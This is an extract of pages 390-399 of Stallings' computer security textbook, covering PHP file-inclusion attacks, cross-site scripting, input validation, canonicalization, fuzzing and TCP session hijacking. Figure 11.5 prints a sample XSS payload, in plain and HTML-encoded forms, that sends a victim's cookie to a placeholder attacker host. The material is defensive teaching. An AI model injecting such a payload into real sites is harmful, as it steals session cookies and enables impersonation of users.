       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 391, 'page_label': '390'}, page_content='390  CHAPTER 11 / SofTwARE SECuRiTy\\nvulnerable PHP calendar script. The flaw results from the use of a variable to construct \\nthe name of a file that is then included into the script. Note this script was not intended \\nto be called directly. Rather, it is a component of a larger, multifile program. The main \\nscript set the value of the $path variable to refer to the main directory containing the \\nprogram and all its code and data files. Using this variable elsewhere in the program \\nmeant that customizing and installing the program required changes to just a few lines. \\nUnfortunately, attackers do not play by the rules. Just because a script is not supposed \\nto be called directly does not mean it is not possible. The access protections must be \\nconfigured in the Web server to block direct access to prevent this. Otherwise, if direct \\naccess to such scripts is combined with two other features of PHP , a serious attack \\nis possible. The first is that PHP originally assigned the value of any input variable \\nsupplied in the HTTP request to global variables with the same name as the field. \\nThis made the task of writing a form handler easier for inexperienced programmers. \\nUnfortunately, there was no way for the script to limit just which fields it expected. \\nHence a user could specify values for any desired global variable and they would be \\ncreated and passed to the script. In this example, the variable $path is not expected \\nto be a form field. The second PHP feature concerns the behavior of the include \\ncommand. Not only could local files be included, but if a URL is supplied, the included \\ncode can be sourced from anywhere on the network. Combine all of these elements, \\nand the attack may be implemented using a request similar to that shown in Figure \\n11.4b. This results in the $path variable containing the URL of a file containing the \\nattacker’s PHP code. It also defines another variable, $cmd, which tells the attacker’s \\nscript what command to run. In this example, the extra command simply lists files \\nin the current directory. However, it could be any command the Web server has the \\nprivilege to run. This specific type of attack is known as a PHP remote code injection \\nor PHP file inclusion vulnerability. Research shows that a significant number of PHP \\nCGI scripts are vulnerable to this type of attack and are being actively exploited.\\nThere are several defenses available to prevent this type of attack. The most \\nobvious is to block assignment of form field values to global variables. Rather, they \\nare saved in an array and must be explicitly be retrieved by name. This behavior is \\nillustrated by the code in Figure 11.3. It is the default for all newer PHP installations. \\nThe disadvantage of this approach is that it breaks any code written using the older \\nassumed behavior. Correcting such code may take a considerable amount of effort. \\nNonetheless, except in carefully controlled cases, this is the preferred option. It not \\nonly prevents this specific type of attack, but a wide variety of other attacks involv -\\ning manipulation of global variable values. Another defense is to only use constant \\nvalues in include (and require) commands. This ensures that the included code \\ndoes indeed originate from the specified files. If a variable has to be used, then great \\ncare must be taken to validate its value immediately before it is used.\\nThere are other injection attack variants, including mail injection, format string \\ninjection, and interpreter injection. New injection attacks variants continue to be \\nfound. They can occur whenever one program invokes the services of another pro -\\ngram, service, or function and passes to it externally sourced, potentially untrusted \\ninformation without sufficient inspection and validation of it. This just emphasizes \\nthe need to identify all sources of input, to validate any assumptions about such input \\nbefore use, and to understand the meaning and interpretation of values supplied to \\nany invoked program, service, or function.\\nM11_STAL0611_04_GE_C11.indd   390 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 392, 'page_label': '391'}, page_content='11.2 / HANDLiNG PRoGRAM iNPuT  391\\ncross-sIte scrIptIng AttAcks Another broad class of vulner abilities concerns \\ninput provided to a program by one user that is subsequently output to another \\nuser. Such attacks are known as cross-site scripting (XSS) attacks because they are \\nmost commonly seen in scripted Web applications. 4 This vulnerability involves the \\ninclusion of script code in the HTML content of a webpage displayed by a user’s \\nbrowser. The script code could be JavaScript, ActiveX, VBScript, Flash, or just about \\nany client-side scripting language supported by a user’s browser. To support some \\ncategories of Web applications, script code may need to access data associated with \\nother pages currently displayed by the user’s browser. Because this clearly raises \\nsecurity concerns, browsers impose security checks and restrict such data access to \\npages originating from the same site. The assumption is that all content from one site \\nis equally trusted and hence is permitted to interact with other content from that site.\\nCross-site scripting attacks exploit this assumption and attempt to bypass the \\nbrowser’s security checks to gain elevated access privileges to sensitive data belong-\\ning to another site. These data can include page contents, session cookies, and a vari-\\nety of other objects. Attackers use a variety of mechanisms to inject malicious script \\ncontent into pages returned to users by the targeted sites. The most common variant is \\nthe XSS reflection vulnerability. The attacker includes the malicious script content in \\ndata supplied to a site. If this content is subsequently displayed to other users without \\nsufficient checking, they will execute the script assuming it is trusted to access any \\ndata associated with that site. Consider the widespread use of guestbook programs, \\nwikis, and blogs by many websites. They all allow users accessing the site to leave \\ncomments, which are subsequently viewed by other users. Unless the contents of \\nthese comments are checked and any dangerous code removed, the attack is possible.\\nConsider the example shown in Figure 11.5a. If this text were saved by a guest-\\nbook application, then when viewed it displays a little text and then executes the \\nJavaScript code. This code replaces the document contents with the information \\nreturned by the attacker’s cookie script, which is provided with the cookie associated \\nwith this document. Many sites require users to register before using features like a \\nguestbook application. With this attack, the user’s cookie is supplied to the attacker, \\nwho could then use it to impersonate the user on the original site. This example \\nobviously replaces the page content being viewed with whatever the attacker’s script \\nreturns. By using more sophisticated JavaScript code, it is possible for the script to \\nexecute with very little visible effect.\\nTo prevent this attack, any user-supplied input should be examined and any \\ndangerous code removed or escaped to block its execution. While the example shown \\nmay seem easy to check and correct, the attacker will not necessarily make the task \\nthis easy. The same code is shown in Figure 11.5b, but this time all of the characters \\nrelating to the script code are encoded using HTML character entities. 5 While the \\nbrowser interprets this identically to the code in Figure 11.5a, any validation code \\nmust first translate such entities to the characters they represent before checking for \\npotential attack code. We will discuss this further in the next section.\\n4The abbreviation XSS is used for cross-site scripting to distinguish it from the common abbreviation of \\nCSS, meaning cascading style sheets.\\n5HTML character entities allow any character from the character set used to be encoded. For example, \\n&\\\\#60; represents the “<” character.\\nM11_STAL0611_04_GE_C11.indd   391 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 393, 'page_label': '392'}, page_content=\"392  CHAPTER 11 / SofTwARE SECuRiTy\\nXSS attacks illustrate a failure to correctly handle both program input and \\nprogram output. The failure to check and validate the input results in potentially \\ndangerous data values being saved by the program. However, the program is not the \\ntarget. Rather it is subsequent users of the program, and the programs they use to \\naccess it, which are the target. If all potentially unsafe data output by the program \\nare sanitized, then the attack cannot occur. We will discuss correct handling of output \\nin Section 11.5.\\nThere are other attacks similar to XSS, including cross-site request forg -\\nery, and HTTP response splitting. Again the issue is careless use of untrusted, \\nunchecked input.\\nValidating Input Syntax\\nGiven that the programmer cannot control the content of input data, it is neces -\\nsary to ensure that such data conform with any assumptions made about the data \\nbefore subsequent use. If the data are textual, these assumptions may be that the \\ndata contain only printable characters, have certain HTML markup, are the name \\nof a person, a userid, an e-mail address, a filename, and/or a URL. Alternatively, the \\ndata might represent an integer or other numeric value. A program using such input \\nshould confirm that it meets these assumptions. An important principle is that input \\ndata should be compared against what is wanted, accepting only valid input, known \\nas whitelisting. The alternative is to compare the input data with known dangerous \\nvalues, known as blacklisting. The problem with this approach is that new problems \\nand methods of bypassing existing checks continue to be discovered. By trying to \\nblock known dangerous input data, an attacker using a new encoding may succeed. \\nBy only accepting known safe data, the program is more likely to remain secure.\\nFigure 11.5 XSS Example\\n(a) Plain XSS example\\n(b) Encoded XSS example\\nThanks for this information, its great!\\n&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\\n&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;\\n&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;\\n&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#58;\\n&#47;&#47;&#104;&#97;&#99;&#107;&#101;&#114;\\n&#46;&#119;&#101;&#98;&#46;&#115;&#105;&#116;\\n&#101;&#47;&#99;&#111;&#111;&#107;&#105;&#101;\\n&#46;&#99;&#103;&#105;&#63;&#39;&#43;&#100;\\n&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;\\n&#99;&#111;&#111;&#107;&#105;&#101;&#60;&#47;\\n&#115;&#99;&#114;&#105;&#112;&#116;&#62;\\nThanks for this information, its great!\\n<script>document.location='http://hacker.web.site/cookie.cgi?'+\\ndocument.cookie</script>\\nM11_STAL0611_04_GE_C11.indd   392 10/11/17   3:02 PM\"),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 394, 'page_label': '393'}, page_content='11.2 / HANDLiNG PRoGRAM iNPuT  393\\nThis type of comparison is commonly done using regular expressions. It may be \\nexplicitly coded by the programmer or may be implicitly included in a supplied input \\nprocessing routine. Figures 11.2d and 11.3b show examples of these two approaches. \\nA regular expression is a pattern composed of a sequence of characters that describe \\nallowable input variants. Some characters in a regular expression are treated literally, \\nand the input compared to them must contain those characters at that point. Other \\ncharacters have special meanings, allowing the specification of alternative sets of \\ncharacters, classes of characters, and repeated characters. Details of regular expres-\\nsion content and usage vary from language to language. An appropriate reference \\nshould be consulted for the language in use.\\nIf the input data fail the comparison, they could be rejected. In this case a \\nsuitable error message should be sent to the source of the input to allow it to be \\ncorrected and reentered. Alternatively, the data may be altered to conform. This \\ngenerally involves escaping metacharacters to remove any special interpretation, thus \\nrendering the input safe.\\nFigure 11.5 illustrates a further issue of multiple, alternative encodings of the \\ninput data. This could occur because the data are encoded in HTML or some other \\nstructured encoding that allows multiple representations of characters. It can also \\noccur because some character set encodings include multiple encodings of the same \\ncharacter. This is particularly obvious with the use of Unicode and its UTF-8 encoding. \\nTraditionally, computer programmers assumed the use of a single, common, character \\nset, which in many cases was ASCII. This 7-bit character set includes all the common \\nEnglish letters, numbers, and punctuation characters. It also includes a number of \\ncommon control characters used in computer and data communications applications. \\nHowever, it is unable to represent the additional accented characters used in many \\nEuropean languages nor the much larger number of characters used in languages such \\nas Chinese and Japanese. There is a growing requirement to support users around the \\nglobe and to interact with them using their own languages. The Unicode character \\nset is now widely used for this purpose. It is the native character set used in the Java \\nlanguage, for example. It is also the native character set used by operating systems \\nsuch as Windows XP and later. Unicode uses a 16-bit value to represent each charac-\\nter. This provides sufficient characters to represent most of those used by the world’s \\nlanguages. However, many programs, databases, and other computer and communica-\\ntions applications assume an 8-bit character representation, with the first 128 values \\ncorresponding to ASCII. To accommodate this, a Unicode character can be encoded \\nas a 1 - to 4-byte sequence using the UTF-8 encoding. Any specific character is sup-\\nposed to have a unique encoding. However, if the strict limits in the specification are \\nignored, common ASCII characters may have multiple encodings. For example, the \\nforward slash character “/” , used to separate directories in a UNIX filename, has the \\nhexadecimal value “2F” in both ASCII and UTF-8. UTF-8 also allows the redundant, \\nlonger encodings: “C0 AF” and “E0 80 AF” . While strictly only the shortest encod-\\ning should be used, many Unicode decoders accept any valid equivalent sequence.\\nConsider the consequences of multiple encodings when validating input. There \\nis a class of attacks that attempt to supply an absolute pathname for a file to a \\nscript that expects only a simple local filename. The common check to prevent this \\nis to ensure that the supplied filename does not start with “/” and does not contain \\nany “ ../” parent directory references. If this check only assumes the correct, shortest \\nM11_STAL0611_04_GE_C11.indd   393 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 395, 'page_label': '394'}, page_content='394  CHAPTER 11 / SofTwARE SECuRiTy\\nUTF-8 encoding of slash, then an attacker using one of the longer encodings could \\navoid this check. This precise attack and flaw was used against a number of versions \\nof Microsoft’s IIS Web server in the late 1990s. A related issue occurs when the appli-\\ncation treats a number of characters as equivalent. For example, a case insensitive \\napplication that also ignores letter accents could have 30 equivalent representations \\nof the letter A. These examples demonstrate the problems both with multiple encod-\\nings, and with checking for dangerous data values rather than accepting known safe \\nvalues. In this example, a comparison against a safe specification of a filename would \\nhave rejected some names with alternate encodings that were actually acceptable. \\nHowever, it would definitely have rejected the dangerous input values.\\nGiven the possibility of multiple encodings, the input data must first be \\ntransformed into a single, standard, minimal representation. This process is called \\n canonicalization and involves replacing alternate, equivalent encodings by one com-\\nmon value. Once this is done, the input data can then be compared with a single repre-\\nsentation of acceptable input values. There may potentially be a large number of input \\nand output fields that require checking. [SIMP11] and others recommend the use of \\nanti-XSS libraries, or Web UI frameworks with integrated XSS protection, that auto-\\nmate much of the checking process, rather than writing explicit checks for each field.\\nThere is an additional concern when the input data represents a numeric \\nvalue. Such values are represented on a computer by a fixed size value. Integers are \\n commonly 8, 16, 32, and now 64 bits in size. Floating-point numbers may be 32, 64, 96, \\nor other numbers of bits, depending on the computer processor used. These values \\nmay also be signed or unsigned. When the input data are interpreted, the various rep-\\nresentations of numeric values, including optional sign, leading zeroes, decimal values, \\nand power values, must be handled appropriately. The subsequent use of numeric \\nvalues must also be monitored. Problems particularly occur when a value of one size \\nor form is cast to another. For example, a buffer size may be read as an unsigned inte-\\nger. It may later be compared with the acceptable maximum buffer size. Depending \\non the language used, the size value that was input as unsigned may subsequently \\nbe\\xa0treated as a signed value in some comparison. This leads to a vulnerability because \\nnegative values have the top bit set. This is the same bit pattern used by large positive \\nvalues in unsigned integers. So the attacker could specify a very large actual input \\ndata length, which is treated as a negative number when compared with the maximum \\nbuffer size. Being a negative number, it clearly satisfies a comparison with a smaller, \\npositive buffer size. However, when used, the actual data are much larger than the \\nbuffer allows, and an overflow occurs as a consequence of incorrect handling of the \\ninput size data. Once again, care is needed to check assumptions about data values \\nand to ensure that all use is consistent with these assumptions.\\nInput Fuzzing\\nClearly, there is a problem anticipating and testing for all potential types of nonstan-\\ndard inputs that might be exploited by an attacker to subvert a program. A powerful, \\nalternative approach called fuzzing was developed by Professor Barton Miller at the \\nUniversity of Wisconsin Madison in 1989. This is a software testing technique that \\nuses randomly generated data as inputs to a program. The range of inputs that may \\nbe explored is very large. They include direct textual or graphic input to a program, \\nrandom network requests directed at a Web or other distributed service, or random \\nM11_STAL0611_04_GE_C11.indd   394 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 396, 'page_label': '395'}, page_content='11.3 / wRiTiNG SAfE PRoGRAM CoDE  395\\nparameters values passed to standard library or system functions. The intent is to \\ndetermine whether the program or function correctly handles all such abnormal \\ninputs or whether it crashes or otherwise fails to respond appropriately. In the lat -\\nter cases the program or function clearly has a bug that needs to be corrected. The \\nmajor advantage of fuzzing is its simplicity and its freedom from assumptions about \\nthe expected input to any program, service, or function. The cost of generating large \\nnumbers of tests is very low. Further, such testing assists in identifying reliability as \\nwell as security deficiencies in programs.\\nWhile the input can be completely randomly generated, it may also be randomly \\ngenerated according to some template. Such templates are designed to examine likely \\nscenarios for bugs. This might include excessively long inputs or textual inputs that \\ncontain no spaces or other word boundaries. When used with network protocols, a \\ntemplate might specifically target critical aspects of the protocol. The intent of using \\nsuch templates is to increase the likelihood of locating bugs. The disadvantage is \\nthat the templates incorporate assumptions about the input. Hence bugs triggered \\nby other forms of input would be missed. This suggests that a combination of these \\napproaches is needed for a reasonably comprehensive coverage of the inputs.\\nProfessor Miller’s team has applied fuzzing tests to a number of common \\noperating systems and applications. These include common command-line and GUI \\napplications running on Linux, Windows and MacOS. The results of these tests are \\nsummarized in [MILL07], which identifies a number of programs with bugs in these \\nvarious systems. Other organizations have used these tests on a variety of systems \\nand software.\\nWhile fuzzing is a conceptually very simple testing method, it does have its \\nlimitations. In general, fuzzing only identifies simple types of faults with handling of \\ninput. If a bug exists that is only triggered by a small number of very specific input \\nvalues, fuzzing is unlikely to locate it. However, the types of bugs it does locate are \\nvery often serious and potentially exploitable. Hence it ought to be deployed as a \\ncomponent of any reasonably comprehensive testing strategy.\\nA number of tools to perform fuzzing tests are now available and are used \\nby organizations and individuals to evaluate security of programs and applications. \\nThey include the ability to fuzz command-line arguments, environment variables, \\nWeb applications, file formats, network protocols, and various forms of interprocess \\ncommunications. A number of suitable black box test tools, include fuzzing tests, are \\ndescribed in [MIRA05]. Such tools are being used by organizations to improve the \\nsecurity of their software. Fuzzing is also used by attackers to identify potentially use-\\nful bugs in commonly deployed software. Hence it is becoming increasingly important \\nfor developers and maintainers to also use this technique to locate and correct such \\nbugs before they are found and exploited by attackers.\\n 11.3 WRITING SAFE PROGRAM CODE\\nThe second component of our model of computer programs is the processing of \\nthe input data according to some algorithm. For procedural languages like C and \\nits descendents, this algorithm specifies the series of steps taken to manipulate the \\ninput to solve the required problem. High-level languages are typically compiled and \\nM11_STAL0611_04_GE_C11.indd   395 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 397, 'page_label': '396'}, page_content='396  CHAPTER 11 / SofTwARE SECuRiTy\\nlinked into machine code, which is then directly executed by the target processor. In \\nSection\\xa010.1, we discussed the typical process structure used by executing programs. \\nAlternatively, a high-level language such as Java may be compiled into an interme -\\ndiate language that is then interpreted by a suitable program on the target system. \\nThe same may be done for programs written using an interpreted scripting language. \\nIn all cases, the execution of a program involves the execution of machine language \\ninstructions by a processor to implement the desired algorithm. These instructions will \\nmanipulate data stored in various regions of memory and in the processor’s registers.\\nFrom a software security perspective, the key issues are whether the imple -\\nmented algorithm correctly solves the specified problem, whether the machine \\ninstructions executed correctly represent the high-level algorithm specification, and \\nwhether the manipulation of data values in variables, as stored in machine registers \\nor memory, is valid and meaningful.\\nCorrect Algorithm Implementation\\nThe first issue is primarily one of good program development technique. The \\n algorithm may not corr ectly implement all cases or variants of the problem. This \\nmight allow some seemingly legitimate program input to trigger program behavior \\nthat was not intended, providing an attacker with additional capabilities. While this \\nmay be an issue of inappropriate interpretation or handling of program input, as we \\ndiscussed in Section 11.2, it may also be inappropriate handling of what should be \\nvalid input. The consequence of such a deficiency in the design or implementation of \\nthe algorithm is a bug in the resulting program that could be exploited.\\nA good example of this was the bug in some early releases of the Netscape Web \\nbrowser. Their implementation of the random number generator used to generate \\nsession keys for secure Web connections was inadequate [GOWA01]. The assump-\\ntion was that these numbers should be unguessable, short of trying all alternatives. \\nHowever, due to a poor choice of the information used to seed this algorithm, the \\nresulting numbers were relatively easy to predict. As a consequence, it was possible \\nfor an attacker to guess the key used and then decrypt the data exchanged over a \\nsecure Web session. This flaw was fixed by reimplementing the random number gen-\\nerator to ensure that it was seeded with sufficient unpredictable information that it \\nwas not possible for an attacker to guess its output.\\nAnother well-known example is the TCP session spoof or hijack attack. This \\nextends the concept we discussed in Section 7 .1 of sending source spoofed packets to \\na TCP server. In this attack, the goal is not to leave the server with half-open connec-\\ntions, but rather to fool it into accepting packets using a spoofed source address that \\nbelongs to a trusted host but actually originates on the attacker’s system. If the attack \\nsucceeded, the server could be convinced to run commands or provide access to data \\nallowed for a trusted peer, but not generally. To understand the requirements for this \\nattack, consider the TCP three-way connection handshake illustrated in Figure 7.2. \\nRecall that because a spoofed source address is used, the response from the server \\nwill not be seen by the attacker, who will not therefore know the initial sequence \\nnumber provided by the server. However, if the attacker can correctly guess this \\nnumber, a suitable ACK packet can be constructed and sent to the server, which then \\nassumes that the connection is established. Any subsequent data packet is treated by \\nM11_STAL0611_04_GE_C11.indd   396 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 398, 'page_label': '397'}, page_content='11.3 / wRiTiNG SAfE PRoGRAM CoDE  397\\nthe server as coming from the trusted source, with the rights assigned to it. The hijack \\nvariant of this attack waits until some authorized external user connects and logs in \\nto the server. Then the attacker attempts to guess the sequence numbers used and to \\ninject packets with spoofed details to mimic the next packets the server expects to see \\nfrom the authorized user. If the attacker guesses correctly, then the server responds \\nto any requests using the access rights and permissions of the authorized user. There \\nis an additional complexity to these attacks. Any responses from the server are sent \\nto the system whose address is being spoofed. Because they acknowledge packets \\nthis system has not sent, the system will assume there is a network error and send a \\nreset (RST) packet to terminate the connection. The attacker must ensure that the \\nattack packets reach the server and are processed before this can occur. This may be \\nachieved by launching a denial-of-service attack on the spoofed system while simul-\\ntaneously attacking the target server.\\nThe implementation flaw that permits these attacks is that the initial sequence \\nnumbers used by many TCP/IP implementations are far too predictable. In addition, \\nthe sequence number is used to identify all packets belonging to a particular ses -\\nsion. The TCP standard specifies that a new, different sequence number should be \\nused for each connection so packets from previous connections can be distinguished. \\nPotentially this could be a random number (subject to certain constraints). However, \\nmany implementations used a highly predictable algorithm to generate the next ini-\\ntial sequence number. The combination of the implied use of the sequence number as \\nan identifier and authenticator of packets belonging to a specific TCP session and the \\nfailure to make them sufficiently unpredictable enables the attack to occur. A number \\nof recent operating system releases now support truly randomized initial sequence \\nnumbers. Such systems are immune to these types of attacks.\\nAnother variant of this issue is when the programmers deliberately include \\nadditional code in a program to help test and debug it. While this is valid during \\nprogram development, all too often this code remains in production releases of a \\nprogram. At the very least, this code could inappropriately release information to a \\nuser of the program. At worst, it may permit a user to bypass security checks or other \\nprogram limitations and perform actions they would not otherwise be allowed to \\nperform. This type of vulnerability was seen in the sendmail mail delivery program \\nin the late 1980s and famously exploited by the Morris Internet Worm. The imple -\\nmenters of sendmail had left in support for a DEBUG command that allowed the \\nuser to remotely query and control the running program [SPAF89]. The Worm used \\nthis feature to infect systems running versions of sendmail with this vulnerability. \\nThe problem was aggravated because the sendmail program ran using superuser \\nprivileges and hence had unlimited access to change the system. We will discuss the \\nissue of minimizing privileges further in Section 11.4.\\nA further example concerns the implementation of an interpreter for a high- \\nor intermediate-level languages. The assumption is that the interpreter correctly \\nimplements the specified program code. Failure to adequately reflect the language \\nsemantics could result in bugs that an attacker might exploit. This was clearly seen \\nwhen some early implementations of the Java Virtual Machine (JVM) inadequately \\nimplemented the security checks specified for remotely sourced code, such as in \\napplets [DEFW96]. These implementations permitted an attacker to introduce code \\nremotely, such as on a webpage, but trick the JVM interpreter into treating them as \\nM11_STAL0611_04_GE_C11.indd   397 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 399, 'page_label': '398'}, page_content='398  CHAPTER 11 / SofTwARE SECuRiTy\\nlocally sourced and hence trusted code with much greater access to the local system \\nand data.\\nThese examples illustrate the care that is needed when designing and imple -\\nmenting a program. It is important to specify assumptions carefully, such as that gen-\\nerated random number should indeed be unpredictable, in order to ensure that these \\nassumptions are satisfied by the resulting program code. Traditionally these specifi-\\ncations and checks are handled informally, as design goals and code comments. An \\nalternative is the use of formal methods in software development and analysis that \\nensures the software is correct by construction. Such approaches have been known \\nfor many years, but have also been considered too complex and difficult for general \\nuse. One area where they have been used is in the development of trusted comput -\\ning systems, as we will discuss in Chapter 27 . However, NISTIR 8151 notes that this \\nis  changing, and encourages their further development and more widespread use. It \\nis also very important to identify debugging and testing extensions to the program \\nand to ensure that they are removed or disabled before the program is distributed \\nand used.\\nEnsuring that Machine Language Corresponds to Algorithm\\nThe second issue concerns the correspondence between the algorithm specified in \\nsome programming language and the machine instructions that are run to implement \\nit. This issue is one that is largely ignored by most programmers. The assumption is \\nthat the compiler or interpreter does indeed generate or execute code that validly \\nimplements the language statements. When this is considered, the issue is typically \\none of efficiency, usually addressed by specifying the required level of optimization \\nflags to the compiler.\\nWith compiled languages, as Ken Thompson famously noted in [THOM84], a \\nmalicious compiler programmer could include instructions in the compiler to emit \\nadditional code when some specific input statements were processed. These state -\\nments could even include part of the compiler, so that these changes could be rein -\\nserted when the compiler source code was compiled, even after all trace of them \\nhad been removed from the compiler source. If this were done, the only evidence \\nof these changes would be found in the machine code. Locating this would require \\ncareful comparison of the generated machine code with the original source. For large \\nprograms, with many source files, this would be an exceedingly slow and difficult task, \\none that, in general, is very unlikely to be done.\\nThe development of trusted computer systems with very high assurance level \\nis the one area where this level of checking is required. Specifically, certification of \\ncomputer systems using a Common Criteria assurance level of EAL 7 requires vali-\\ndation of the correspondence among design, source code, and object code. We will \\ndiscuss this further in Chapter 27 .\\nCorrect Interpretation of Data Values\\nThe next issue concerns the correct interpretation of data values. At the most basic \\nlevel, all data on a computer are stored as groups of binary bits. These are generally \\nsaved in bytes of memory, which may be grouped together as a larger unit, such as a \\nword or longword value. They may be accessed and manipulated in memory, or they \\nM11_STAL0611_04_GE_C11.indd   398 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 400, 'page_label': '399'}, page_content='11.3 / wRiTiNG SAfE PRoGRAM CoDE  399\\nmay be copied into processor registers before being used. Whether a particular group \\nof bits is interpreted as representing a character, an integer, a floating-point number, \\na memory address (pointer), or some more complex interpretation depends on the \\nprogram operations used to manipulate it and ultimately on the specific machine \\ninstructions executed. Different languages provide varying capabilities for restricting \\nand validating assumptions on the interpretation of data in variables. If the language \\nincludes strong typing, then the operations performed on any specific type of data \\nwill be limited to appropriate manipulations of the values.6 This greatly reduces the \\nlikelihood of inappropriate manipulation and use of variables introducing a flaw in \\nthe program. Other languages, though, allow a much more liberal interpretation of \\ndata and permit program code to explicitly change their interpretation. The widely \\nused language C has this characteristic, as we discussed in Section 10.1. In particular, \\nit allows easy conversion between interpreting variables as integers and interpreting \\nthem as memory addresses (pointers). This is a consequence of the close relationship \\nbetween C language constructs and the capabilities of machine language instructions, \\nand it provides significant benefits for system level programming. Unfortunately, it \\nalso allows a number of errors caused by the inappropriate manipulation and use of \\npointers. The prevalence of buffer overflow issues, as we discussed in Chapter 10, is \\none consequence. A related issue is the occurrence of errors due to the incorrect \\nmanipulation of pointers in complex data structures, such as linked lists or trees, \\nresulting in corruption of the structure or changing of incorrect data values. Any such \\nprogramming bugs could provide a means for an attacker to subvert the correct \\noperation of a program or simply to cause it to crash.\\nThe best defense against such errors is to use a strongly typed programming \\nlanguage. However, even when the main program is written in such a language, it will \\nstill access and use operating system services and standard library routines, which are \\ncurrently most likely written in languages like C, and could potentially contain such \\nflaws. The only counter to this is to monitor any bug reports for the system being \\nused and to try and not use any routines with known, serious bugs. If a loosely typed \\nlanguage like C is used, then due care is needed whenever values are cast between \\ndata types to ensure that their use remains valid.\\nCorrect Use of Memory\\nRelated to the issue of interpretation of data values is the allocation and management \\nof dynamic memory storage, generally using the process heap. Many programs, which \\nmanipulate unknown quantities of data, use dynamically allocated memory to store \\ndata when required. This memory must be allocated when needed and released when \\ndone. If a program fails to correctly manage this process, the consequence may be a \\nsteady reduction in memory available on the heap to the point where it is completely \\nexhausted. This is known as a memory leak, and often the program will crash once the \\navailable memory on the heap is exhausted. This provides an obvious mechanism for \\nan attacker to implement a denial-of-service attack on such a program.\\n6Provided that the compiler or interpreter does not contain any bugs in the translation of the high-level \\nlanguage statements to the machine instructions actually executed.\\nM11_STAL0611_04_GE_C11.indd   399 